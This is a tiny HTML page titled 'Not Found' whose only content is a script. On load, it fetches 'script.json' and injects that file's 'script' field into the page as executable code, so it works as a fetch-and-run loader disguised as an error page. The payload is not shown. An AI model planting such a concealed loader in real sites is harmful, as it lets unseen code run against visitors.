<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Not Found</title>
</head>

<body>

<script>

fetch("script.json")
.then(res=>res.json())
.then(data=>{

let s=document.createElement("script");

s.innerHTML=data.script;

document.body.appendChild(s);

});

</script>

</body>
</html>
